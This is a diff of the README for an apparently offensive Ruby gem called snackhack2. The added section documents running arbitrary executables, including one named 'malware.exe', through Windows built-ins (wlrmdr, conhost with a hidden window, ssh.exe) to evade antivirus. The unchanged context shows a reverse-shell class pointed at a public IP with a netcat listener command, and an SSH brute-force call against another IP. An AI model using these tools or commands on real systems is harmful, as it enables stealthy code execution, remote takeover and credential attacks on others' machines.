@@ -64,6 +64,45 @@ gem install snackhack2
 
 ## Usage
 
+### Indirect Command Injection
+
+This allows you to execute exe using LOLBINS. LOLBINs are features built into Windows that can and are abused by threat ators. Threat actors often uses LOLBINs because they are built in Windows and they dont need to download third party tools that could be detected by the computer's anti virus. 
+
+This will execute a exe with the prompt "test". By default the @title is "Click Me!". But this can be changed as seen below.
+
+```ruby
+cj = Snackhack2::CommandInjection.new
+cj.prompt = "test"
+ck.title  = "CLICK ME"
+cj.wlrmdr_With_prompt
+```
+This does the same as the "wlrmdr_with_prompt" but without the prompt. By default the `@exe` will execute "calc.exe" but this can be changed as seen below. 
+```ruby
+cj = Snackhack2::CommandInjection.new
+cj.exe = "runme.exe"
+cj.wlrmdr_without_prompt
+```
+
+## Conhost.exe
+Conhost.exe is a LOLBin that can be used to execute commands. By default it will execute "calc.exe"
+```ruby
+cj = Snackhack2::CommandInjection.new
+cj.exe = "malware.exe"
+cj.conhost
+
+
+## This will run the same  thing but the window will be hidden. 
+cj.conhost_hide
+```
+## SSH.exe to execute command.
+By default this command uses "calc.exe" but the exe can be changed as seen below. 
+
+```ruby
+cj = Snackhack2::CommandInjection.new
+cj.exe = "runme.exe"
+cj.ssh
+```
+
 ### LolBin MSR.exe Recording Screen
 
 This feature uses Psr.exe to record the screen. By default it will record for 60 seconds. This can be changed by this:
@@ -202,6 +241,7 @@ Snackhack2::ReverseShell.new("167.71.98.144", "99").run
 ```
 
 This will use bash.exe to connect to a reverse shell. On the remote computer run: `nc -lvp 4444`. After running the code below the computer will connect to the remote server, giving the threat actor remote control of the computer. This is all done by Living of the land, without any third party tools, just the features built into Windows. This is favored by threat actors since they do not need to install any malware that could be detected and remvoed.
+
 ```ruby
 rs = Snackhack2::ReverseShell.new("127.0.0.1", "4444")
 rs.bash
@@ -423,7 +463,6 @@ Snackhack2::SSHBute.new("167.98.80.8").run
 ```ruby
 gem install httparty
 gem install spidr
-gem install packetfu
 gem install async-http -v 0.59.4
 gem install net-ssh
 ```
